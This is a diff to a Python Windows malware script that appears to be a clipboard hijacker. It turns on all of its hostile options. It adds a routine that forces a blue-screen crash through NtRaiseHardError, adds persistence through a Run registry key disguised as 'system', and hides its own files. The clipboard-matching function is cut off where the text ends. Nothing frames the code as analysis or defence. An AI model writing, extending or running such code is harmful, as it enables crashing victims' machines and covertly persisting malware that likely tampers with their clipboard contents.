@@ -2,43 +2,35 @@ import pyperclip
 import time
 import re
 
-CRITICAL_PROCCESS = False
-ADD_TO_STARTUP = True
-HIDE_BINARIES = False
+CRITICAL_PROCCESS = True
+ADD_TO_STARTUP = True 
+HIDE_BINARIES = True
 
 def critproc():
     import ctypes
-    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
-    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-    print("[*] Established as critical process")  
-    
-
-def startup():
-    import ctypes
-    import os
-    import sys
-    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if is_admin == True:  
-        path = sys.argv[0]
-        os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
-        print(path)
-        e = r"""
-        Set objShell = WScript.CreateObject("WScript.Shell")
-        objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
-        """.format(os.path.basename(sys.argv[0]))
-        with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
-            f.write(e)
-            f.close()
-        print("[*] Added to startup")  
+    ntdll = ctypes.windll.ntdll
+    prev_value = ctypes.c_bool()
+    res = ctypes.c_ulong()
+    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+        print("BSOD Successfull!")
     else:
-        print("[*] Failed to add to startup. This command requires admin privileges")
+        print("BSOD Failed...")
+    
+# Add to startup
+def startup():
+    import os
+    import inspect
+    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename.replace(".py", ".exe")
+    os.system("""reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "system" /t REG_SZ /d "{}" /f""".format(cmd237))
+    print("[*] Successfully added to startup"+cmd237)
 
 def hide():
     import os
     import inspect
     cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
     os.system("""attrib +h "{}" """.format(cmd237))
-    print("[*] Binaries successfully hidden")
+    print("[*] Binaries successfully h1dden")
 
 def check(clipboard):
     regex = {
